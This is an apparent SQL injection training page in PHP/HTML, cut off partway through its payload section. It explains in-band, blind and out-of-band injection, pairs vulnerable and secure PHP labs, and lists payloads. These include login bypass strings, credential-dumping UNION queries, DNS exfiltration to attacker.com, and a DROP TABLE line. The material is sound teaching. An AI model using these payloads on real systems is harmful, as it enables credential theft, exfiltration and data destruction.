<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
  $isLoggedIn = isset($_SESSION['user_id']);
  $isStrictAuth = true;


  $pageTitle = "SQL Injection (SQLi) - Complete Guide | DarkHunter";
$currentPage = "sqli-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master SQL Injection (SQLi) - From basic UNION attacks to advanced blind exploitation techniques. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/sqli-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <!-- Mobile Menu Button -->
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li>
            <a href="#overview" class="active">
              <i>📚</i> Overview
            </a>
          </li>
          <li>
            <a href="#types">
              <i>🎯</i> Attack Types
            </a>
          </li>
          <li>
            <a href="#workflow">
              <i>⚙️</i> Exploitation Workflow
            </a>
          </li>
          <li>
            <a href="#labs">
              <i>💻</i> Code Labs
            </a>
          </li>
          <li>
            <a href="#payloads">
              <i>💉</i> Payload Arsenal
            </a>
          </li>
          <li>
            <a href="#bypass">
              <i>🚧</i> WAF Bypass
            </a>
          </li>
          <li>
            <a href="#mitigation">
              <i>🛡️</i> Mitigation
            </a>
          </li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li>
            <a href="/DarkHunter/learningBugs/xss-info.php">
              <i>💻</i> XSS
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/csrf-info.php">
              <i>🧬</i> CSRF
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/idor-info.php">
              <i>🆔</i> IDOR
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/ssrf-info.php">
              <i>🌐</i> SSRF
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/ssti-info.php">
              <i>🧪</i> SSTI
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/cors-info.php">
              <i>🔗</i> CORS
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/file-upload-info.php">
              <i>📤</i> File Upload
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/cache-poisoning-info.php">
              <i>🧃</i> Cache Poisoning
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/host-header-info.php">
              <i>🖥️</i> Host Header Injection
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/oauth-info.php">
              <i>🔑</i> OAUTH
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/http-smuggling-info.php">
              <i>📦</i> HTTP Smuggling
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/html-injection-info.php">
              <i>📝</i> HTML Injection
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/lfi-info.php">
              <i>📁</i> LFI
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/jwt-info.php">
              <i>🎫</i> JWT
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/open-redirect-info.php">
              <i>↪️</i> Open Redirect
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/rce-info.php">
              <i>💻</i> RCE
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/race-condition-info.php">
              <i>⚡</i> Race Condition
            </a>
          </li>
        </ul>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Page Header -->
      <div class="page-header">
        <h1 class="page-title">SQL Injection (SQLi)</h1>
        <p class="page-subtitle">
          Master the art of manipulating database queries to extract, modify, or delete sensitive data. From basic UNION
          attacks to advanced blind exploitation techniques.
        </p>
      </div>

      <!-- Table of Contents -->
      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is SQL Injection?</a></li>
            <li><a href="#types">2. Types of SQLi Attacks</a></li>
            <li><a href="#workflow">3. Exploitation Workflow</a></li>
            <li><a href="#labs">4. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#payloads">5. Payload Arsenal</a></li>
            <li><a href="#bypass">6. WAF Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Defense & Mitigation</a></li>
            <li><a href="#advanced">8. Advanced Topics</a></li>
          </ul>
        </div>
      </div>

      <!-- Section 1: Overview -->
      <div id="overview" class="content-card">
        <h2 class="card-title">
          <i>📚</i> What is SQL Injection (SQLi)?
        </h2>

        <div class="highlight-box">
          <strong>Definition:</strong> SQL Injection is a code injection technique that exploits security
          vulnerabilities in an application's software by inserting malicious SQL statements into entry fields for
          execution. It allows attackers to interfere with the queries that an application makes to its database.
        </div>

        <p class="text-content">
          SQL Injection is one of the most dangerous and common web application vulnerabilities. It occurs when
          untrusted user input is concatenated directly into SQL queries without proper sanitization or
          parameterization. This allows attackers to view data they are not normally able to retrieve, modify or delete
          data, and in severe cases, execute administrative operations on the database or operating system.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> SQLi can lead to complete database compromise, sensitive data exposure
          (PII, credentials, financial data), authentication bypass, data integrity loss, and in some cases, remote code
          execution on the database server. It has been the root cause of major data breaches affecting millions of
          users.
        </div>

        <h3 class="subsection-title">The Anatomy of a SQL Query Break</h3>
        <p class="text-content">
          SQL injection works by breaking the intended logic of a SQL query. Consider a simple authentication query:
          <br><br>
          <code class="font-mono">SELECT * FROM users WHERE username = '$username' AND password = '$password'</code>
          <br><br>
          If an attacker inputs <code class="font-mono">' OR '1'='1</code> as the username, the query becomes:
          <br><br>
          <code class="font-mono">SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'</code>
          <br><br>
          The condition <code class="font-mono">'1'='1'</code> is always true, effectively bypassing authentication.
          This is the fundamental principle behind SQL injection: <strong>breaking query logic through malicious input
            concatenation</strong>.
        </p>

        <h3 class="subsection-title">Data Subversion vs. Database Schema Discovery</h3>
        <p class="text-content">
          <strong>Data Subversion</strong> refers to manipulating the database to alter, delete, or insert unauthorized
          data. This includes changing user privileges, modifying account balances, or deleting critical records. The
          attacker is actively changing the state of the data.
        </p>
        <p class="text-content">
          <strong>Database Schema Discovery</strong> is the reconnaissance phase where attackers map out the database
          structure: table names, column names, data types, and relationships. This is typically done using techniques
          like UNION-based injection or error-based extraction to understand how to access valuable data.
        </p>

        <div class="diagram-container">
          <div class="diagram-label">📊 SQL Injection Attack Flow</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Malicious Input → Application → Database → Compromised Data]
          </div>
        </div>
      </div>

      <!-- Section 2: Types -->
      <div id="types" class="content-card">
        <h2 class="card-title">
          <i>🎯</i> Types of SQL Injection Attacks
        </h2>

        <h3 class="subsection-title">1. In-Band SQLi (Classic SQLi)</h3>
        <p class="text-content">
          In-Band SQL Injection is the most common and straightforward type. The attacker uses the same communication
          channel to both launch the attack and gather results. It has two primary sub-types:
        </p>

        <h4>UNION-Based SQL Injection</h4>
        <p class="text-content">
          The UNION operator allows combining the results of two or more SELECT statements. Attackers exploit this to
          extract data from other tables by appending malicious UNION queries to the original query.
        </p>

        <div class="highlight-box">
          <strong>Attack Process:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Determine the number of columns using ORDER BY</li>
            <li>Find which columns accept string data</li>
            <li>Extract database version, user, and database name</li>
            <li>Enumerate table names from information_schema</li>
            <li>Enumerate column names from target tables</li>
            <li>Dump sensitive data using UNION SELECT</li>
          </ol>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">UNION Attack Example</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-comment">-- Original query</span>
<span class="code-keyword">SELECT</span> id, name, description <span class="code-keyword">FROM</span> products <span class="code-keyword">WHERE</span> id = <span class="code-keyword">1</span>

<span class="code-comment">-- Injected payload</span>
<span class="code-keyword">1</span> <span class="code-keyword">UNION SELECT</span> username, password, email <span class="code-keyword">FROM</span> users--

<span class="code-comment">-- Resulting query</span>
<span class="code-keyword">SELECT</span> id, name, description <span class="code-keyword">FROM</span> products <span class="code-keyword">WHERE</span> id = <span class="code-keyword">1</span> 
<span class="code-keyword">UNION SELECT</span> username, password, email <span class="code-keyword">FROM</span> users--</code></pre>
        </div>

        <h4>Error-Based SQL Injection</h4>
        <p class="text-content">
          When applications display detailed database error messages, attackers can use these errors to extract
          information. By crafting inputs that trigger specific errors, sensitive data can be leaked through error
          messages.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Error-Based Extraction</span>
          </div>
          <pre><code><span class="code-comment">-- Extracting version through error</span>
<span class="code-keyword">' AND</span> <span class="code-function">EXTRACTVALUE</span>(<span class="code-keyword">1</span>, <span class="code-function">CONCAT</span>(<span class="code-string">'@@version:'</span>, @@<span class="code-keyword">version</span>))--

<span class="code-comment">-- MySQL error output reveals version info</span>
<span class="code-comment">-- XPATH syntax error: '@@version:8.0.25'</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Inferential SQLi (Blind SQLi)</h3>
        <p class="text-content">
          Blind SQL Injection occurs when the application is vulnerable to SQLi, but the HTTP responses do not contain
          the results of the SQL query or any database error messages. Attackers must infer data by asking the database
          true/false questions and observing application behavior.
        </p>

        <h4>Boolean-Based Blind SQLi</h4>
        <p class="text-content">
          The attacker sends SQL queries that force the application to return different results depending on whether the
          query returns TRUE or FALSE. By observing differences in page content (e.g., "User found" vs "User not
          found"), data can be extracted bit by bit.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Boolean-Based Extraction</span>
          </div>
          <pre><code><span class="code-comment">-- Check if first character of database name is 'a'</span>
<span class="code-keyword">' AND</span> <span class="code-function">SUBSTRING</span>(<span class="code-function">DATABASE</span>(), <span class="code-keyword">1</span>, <span class="code-keyword">1</span>) = <span class="code-string">'a'</span>--

<span class="code-comment">-- If page shows "User exists", first char is 'a'</span>
<span class="code-comment">-- If page shows "User not found", try next character</span>

<span class="code-comment">-- Automated extraction using ASCII comparison</span>
<span class="code-keyword">' AND</span> <span class="code-function">ASCII</span>(<span class="code-function">SUBSTRING</span>((<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users <span class="code-keyword">LIMIT</span> <span class="code-keyword">1</span>), <span class="code-keyword">1</span>, <span class="code-keyword">1</span>)) > <span class="code-keyword">64</span>--</code></pre>
        </div>

        <h4>Time-Based Blind SQLi</h4>
        <p class="text-content">
          When boolean-based methods don't work (no visible content differences), attackers use time delays. The <code
            class="font-mono">SLEEP()</code> or <code class="font-mono">BENCHMARK()</code> functions delay response
          based on conditions, allowing data extraction through timing analysis.
        </p>

        <div class="highlight-box">
          <strong>Time-Based Logic:</strong>
          <ul style="margin-left: 2rem;">
            <li><code class="font-mono">IF(condition, true_action, false_action)</code> - Conditional execution</li>
            <li><code class="font-mono">SLEEP(seconds)</code> - Delay response</li>
            <li>If condition is TRUE → SLEEP executes → Response delayed</li>
            <li>If condition is FALSE → No delay → Immediate response</li>
          </ul>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Time-Based Extraction</span>
          </div>
          <pre><code><span class="code-comment">-- MySQL: Check if first character is 'a' (5 second delay if true)</span>
<span class="code-keyword">' AND</span> <span class="code-function">IF</span>(<span class="code-function">SUBSTRING</span>(<span class="code-function">DATABASE</span>(), <span class="code-keyword">1</span>, <span class="code-keyword">1</span>) = <span class="code-string">'a'</span>, <span class="code-function">SLEEP</span>(<span class="code-keyword">5</span>), <span class="code-keyword">0</span>)--

<span class="code-comment">-- PostgreSQL equivalent using pg_sleep()</span>
<span class="code-string">'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') 
THEN pg_sleep(5) ELSE pg_sleep(0) END--</span>

<span class="code-comment">-- SQL Server using WAITFOR DELAY</span>
<span class="code-string">'; IF (SELECT SUBSTRING((SELECT TOP 1 password FROM users),1,1)) = 'a' 
WAITFOR DELAY '0:0:5'--</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Out-of-Band SQLi (OOB SQLi)</h3>
        <p class="text-content">
          Out-of-Band SQL Injection occurs when the attacker is unable to use the same channel to launch the attack and
          gather results, or when the server responses are unstable. It relies on the database server's ability to make
          DNS or HTTP requests to an external server controlled by the attacker.
        </p>

        <div class="highlight-box">
          <strong>Requirements for OOB:</strong>
          <ul style="margin-left: 2rem;">
            <li>Secure_file_priv MySQL variable allows file operations</li>
            <li>Database user has FILE privileges</li>
            <li>Network egress allows outbound connections</li>
            <li>Functions like LOAD_FILE(), UTL_HTTP, or xp_dirtree available</li>
          </ul>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">DNS Exfiltration Payloads</span>
          </div>
          <pre><code><span class="code-comment">-- MySQL DNS exfiltration using LOAD_FILE()</span>
<span class="code-keyword">' UNION SELECT</span> <span class="code-function">LOAD_FILE</span>(<span class="code-function">CONCAT</span>(<span class="code-string">'\\\\'</span>,(<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users <span class="code-keyword">LIMIT</span> <span class="code-keyword">1</span>),<span class="code-string">'.attacker.com\\a.txt'</span>))--

<span class="code-comment">-- PostgreSQL using dblink (if installed)</span>
<span class="code-keyword">' UNION SELECT</span> dblink_connect(<span class="code-string">'host=attacker.com user=test password='</span>||(<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users))--

<span class="code-comment">-- SQL Server using xp_dirtree</span>
<span class="code-keyword">'; DECLARE @host VARCHAR(1024);</span>
<span class="code-keyword">SELECT</span> @host=(<span class="code-keyword">SELECT</span> <span class="code-function">TOP 1</span> password+<span class="code-string">'.attacker.com'</span> <span class="code-keyword">FROM</span> users);
<span class="code-keyword">EXEC</span>(<span class="code-string">'master..xp_dirtree "\\'</span>+@host+<span class="code-string">'\foo"'</span>)--</code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">👤</div>
            <div class="flow-label">Attacker</div>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🗃️</div>
            <div class="flow-label">Database</div>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">🌐</div>
            <div class="flow-label">DNS Server</div>
          </div>
        </div>
      </div>

      <!-- Section 3: Workflow -->
      <div id="workflow" class="content-card">
        <h2 class="card-title">
          <i>⚙️</i> Exploitation Workflow: From Discovery to Data Dump
        </h2>

        <h3 class="subsection-title">Step 1: Finding the Injection Point</h3>
        <p class="text-content">
          The first step is identifying where user input is incorporated into SQL queries. Test parameters by injecting
          characters that break SQL syntax: single quotes ('), double quotes ("), backslashes (\), and SQL comment
          sequences (-- or #).
        </p>

        <div class="highlight-box">
          <strong>Testing for SQLi:</strong>
          <ul style="margin-left: 2rem;">
            <li><code class="font-mono">'</code> → Triggers syntax error if vulnerable</li>
            <li><code class="font-mono">''</code> → Two quotes may balance and not error</li>
            <li><code class="font-mono">' OR '1'='1</code> → Changes query logic</li>
            <li><code class="font-mono">' AND 1=1 --</code> → Should return normal results</li>
            <li><code class="font-mono">' AND 1=2 --</code> → Should return no results</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Determining Column Count</h3>
        <p class="text-content">
          For UNION-based attacks, you must match the number and data types of columns in the original query. Use ORDER
          BY or UNION SELECT with NULL values to determine column count.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Column Enumeration</span>
          </div>
          <pre><code><span class="code-comment">-- Method 1: ORDER BY (increment until error)</span>
<span class="code-string">?id=1 ORDER BY 1--</span>     <span class="code-comment">-- OK</span>
<span class="code-string">?id=1 ORDER BY 2--</span>     <span class="code-comment">-- OK</span>
<span class="code-string">?id=1 ORDER BY 3--</span>     <span class="code-comment">-- OK</span>
<span class="code-string">?id=1 ORDER BY 4--</span>     <span class="code-comment">-- Error! Only 3 columns</span>

<span class="code-comment">-- Method 2: UNION SELECT with NULLs</span>
<span class="code-string">?id=1 UNION SELECT NULL--</span>              <span class="code-comment">-- Error (column count mismatch)</span>
<span class="code-string">?id=1 UNION SELECT NULL,NULL--</span>         <span class="code-comment">-- Error</span>
<span class="code-string">?id=1 UNION SELECT NULL,NULL,NULL--</span>    <span class="code-comment">-- Success! 3 columns</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Finding String Columns</h3>
        <p class="text-content">
          Replace NULL values with string literals to identify which columns accept string data (for extracting text
          data like usernames and passwords).
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">String Column Identification</span>
          </div>
          <pre><code><span class="code-string">?id=1 UNION SELECT 'a',NULL,NULL--</span>     <span class="code-comment">-- Check if first column accepts strings</span>
<span class="code-string">?id=1 UNION SELECT NULL,'a',NULL--</span>     <span class="code-comment">-- Check second column</span>
<span class="code-string">?id=1 UNION SELECT NULL,NULL,'a'--</span>     <span class="code-comment">-- Check third column</span>

<span class="code-comment">-- If 'a' appears in the output, that column accepts strings</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Database Enumeration</h3>
        <p class="text-content">
          Extract database metadata to understand the environment and locate sensitive tables.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Database Reconnaissance</span>
          </div>
          <pre><code><span class="code-comment">-- Database version</span>
<span class="code-keyword">SELECT</span> @@<span class="code-keyword">version</span>           <span class="code-comment">-- MySQL, SQL Server</span>
<span class="code-keyword">SELECT</span> <span class="code-function">version</span>()          <span class="code-comment">-- PostgreSQL, Oracle</span>

<span class="code-comment">-- Current database name</span>
<span class="code-keyword">SELECT</span> <span class="code-function">DATABASE</span>()        <span class="code-comment">-- MySQL</span>
<span class="code-keyword">SELECT</span> <span class="code-function">CURRENT_DATABASE</span>() <span class="code-comment">-- PostgreSQL</span>

<span class="code-comment">-- Current user</span>
<span class="code-keyword">SELECT</span> <span class="code-function">USER</span>()            <span class="code-comment">-- MySQL</span>
<span class="code-keyword">SELECT</span> <span class="code-function">CURRENT_USER</span>()    <span class="code-comment">-- PostgreSQL</span>

<span class="code-comment">-- List all tables</span>
<span class="code-keyword">SELECT</span> table_name <span class="code-keyword">FROM</span> information_schema.tables 
<span class="code-keyword">WHERE</span> table_schema = <span class="code-function">DATABASE</span>()--

<span class="code-comment">-- List columns in specific table</span>
<span class="code-keyword">SELECT</span> column_name <span class="code-keyword">FROM</span> information_schema.columns 
<span class="code-keyword">WHERE</span> table_name = <span class="code-string">'users'</span>--</code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Data Extraction</h3>
        <p class="text-content">
          Once you know the table and column names, extract the actual sensitive data.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Dumping Sensitive Data</span>
          </div>
          <pre><code><span class="code-comment">-- Extract usernames and passwords</span>
<span class="code-keyword">UNION SELECT</span> username, password, email <span class="code-keyword">FROM</span> users--

<span class="code-comment">-- Concatenate multiple columns into one</span>
<span class="code-keyword">UNION SELECT</span> <span class="code-function">CONCAT</span>(username, <span class="code-string">':'</span>, password), <span class="code-keyword">NULL</span>, <span class="code-keyword">NULL</span> <span class="code-keyword">FROM</span> users--

<span class="code-comment">-- Limit results to avoid detection</span>
<span class="code-keyword">UNION SELECT</span> username, password, email <span class="code-keyword">FROM</span> users <span class="code-keyword">LIMIT</span> <span class="code-keyword">5</span>--</code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Complete SQLi Exploitation Workflow</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step Database Dumping Demonstration]
          </div>
        </div>
      </div>

      <!-- Section 4: Labs -->
      <div id="labs" class="content-card">
        <h2 class="card-title">
          <i>💻</i> Code Labs: Vulnerable vs Secure
        </h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper query construction leads to SQL injection, then
          implement secure alternatives using parameterized queries.
        </div>

        <h3 class="subsection-title">Lab 1: Basic SELECT Injection</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Direct string concatenation in SQL queries.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct concatenation</span>
<span class="code-keyword">$id</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'id'</span>];
<span class="code-keyword">$query</span> = <span class="code-string">"SELECT * FROM products WHERE id = "</span> . <span class="code-keyword">$id</span>;
<span class="code-keyword">$result</span> = <span class="code-keyword">$conn</span>-><span class="code-function">query</span>(<span class="code-keyword">$query</span>); <span class="code-comment">// DANGEROUS!</span>

<span class="code-comment">// Attacker can inject: 1 OR 1=1</span>
<span class="code-comment">// Result: SELECT * FROM products WHERE id = 1 OR 1=1 (returns all rows)</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Code (PDO Prepared Statements)</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Secure: Using prepared statements with parameter binding</span>
<span class="code-keyword">$id</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'id'</span>];
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM products WHERE id = :id"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-string">':id'</span> => <span class="code-keyword">$id</span>]);
<span class="code-keyword">$result</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetch</span>();

<span class="code-comment">// User input is treated as data, never executed as code</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Authentication Bypass</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Login forms that concatenate user input directly into authentication queries.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable Login</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$username</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'username'</span>];
<span class="code-keyword">$password</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'password'</span>];

<span class="code-keyword">$query</span> = <span class="code-string">"SELECT * FROM users WHERE username = '$username' 
         AND password = '$password'"</span>;
<span class="code-keyword">$result</span> = <span class="code-keyword">$conn</span>-><span class="code-function">query</span>(<span class="code-keyword">$query</span>);

<span class="code-comment">// Payload: username = admin' --</span>
<span class="code-comment">// Result: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'</span>
<span class="code-comment">// The password check is commented out!</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Login with Password Hashing</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$username</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'username'</span>];
<span class="code-keyword">$password</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'password'</span>];

<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM users WHERE username = ?"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$username</span>]);
<span class="code-keyword">$user</span> = <span class="code-keyword">$stmt</span>-><span class="code-function">fetch</span>();

<span class="code-keyword">if</span> (<span class="code-keyword">$user</span> && <span class="code-function">password_verify</span>(<span class="code-keyword">$password</span>, <span class="code-keyword">$user</span>[<span class="code-string">'password_hash'</span>])) {
    <span class="code-comment">// Login successful</span>
} <span class="code-keyword">else</span> {
    <span class="code-comment">// Login failed (generic error message)</span>
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: LIKE Clause Injection</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Search functions using LIKE with wildcards that can be manipulated.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable Search</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$search</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'search'</span>];
<span class="code-keyword">$query</span> = <span class="code-string">"SELECT * FROM products WHERE name LIKE '%$search%'"</span>;
<span class="code-comment">// Payload: %' UNION SELECT username,password FROM users--</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Search</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$search</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'search'</span>];
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"SELECT * FROM products WHERE name LIKE ?"</span>);
<span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-string">"%$search%"</span>]);
<span class="code-keyword">?&gt;</span></code></pre>
        </div>
      </div>

      <!-- Section 5: Payloads -->
      <div id="payloads" class="content-card">
        <h2 class="card-title">
          <i>💉</i> Payload Arsenal: Authentication Bypass to Data Extraction
        </h2>

        <h3 class="subsection-title">Authentication Bypass Payloads</h3>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Basic Auth Bypass</span>
          </div>
          <pre><code><span class="code-string">' OR '1'='1</span>                    <span class="code-comment">-- Classic bypass</span>
<span class="code-string">' OR 1=1 --</span>                    <span class="code-comment">-- With comment</span>
<span class="code-string">' OR 1=1 #</span>                     <span class="code-comment">-- MySQL comment style</span>
<span class="code-string">' OR '1'='1' /*</span>                <span class="code-comment">-- Using block comment</span>
<span class="code-string">' OR 1=1 LIMIT 1 --</span>            <span class="code-comment">-- Return only first user</span>
<span class="code-string">admin' --</span>                      <span class="code-comment">-- Login as admin</span>
<span class="code-string">admin' #</span>                       <span class="code-comment">-- MySQL variant</span>
<span class="code-string">admin'/*</span>                       <span class="code-comment">-- Comment rest of query</span></code></pre>
        </div>

        <h3 class="subsection-title">UNION-Based Extraction Payloads</h3>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Data Extraction</span>
          </div>
          <pre><code><span class="code-string">' UNION SELECT null--</span>                              <span class="code-comment">-- Column count test</span>
<span class="code-string">' UNION SELECT null,null--</span>                         <span class="code-comment">-- Two columns</span>
<span class="code-string">' UNION SELECT @@version,null--</span>                    <span class="code-comment">-- Get version</span>
<span class="code-string">' UNION SELECT user(),database()--</span>                 <span class="code-comment">-- User & DB name</span>
<span class="code-string">' UNION SELECT table_name,null FROM information_schema.tables--</span>
<span class="code-string">' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--</span>
<span class="code-string">' UNION SELECT username,password FROM users--</span>      <span class="code-comment">-- Dump credentials</span></code></pre>
        </div>

        <h3 class="subsection-title">Time-Based Blind Payloads</h3>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">MySQL Time-Based</span>
          </div>
          <pre><code><span class="code-string">' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97,SLEEP(5),0)--</span>
<span class="code-string">' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--</span>         <span class="code-comment">-- Alternative syntax</span>
<span class="code-string">' AND 1337=BENCHMARK(5000000,MD5(1))--</span>             <span class="code-comment">-- CPU intensive delay</span></code></pre>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-label">PostgreSQL Time-Based</span>
          </div>
          <pre><code><span class="code-string">'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--</span>
<span class="code-string">'; SELECT pg_sleep(5)--</span>                             <span class="code-comment">-- Simple delay</span></code></pre>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-label">SQL Server Time-Based</span>
          </div>
          <pre><code><span class="code-string">'; IF (1=1) WAITFOR DELAY '0:0:5'--</span>               <span class="code-comment">-- Time delay</span>
<span class="code-string">'; WAITFOR DELAY '0:0:5'--</span>                         <span class="code-comment">-- Simple version</span></code></pre>
        </div>

        <h3 class="subsection-title">Stacked Queries (Multiple Statements)</h3>
        <div class="code-block">
          <div class="code-header">
            <span class="code-label">Data Manipulation</span>
          </div>
          <pre><code><span class="code-string">'; DROP TABLE users--</span>                              <span class="code-comment">-- Delete table</span>
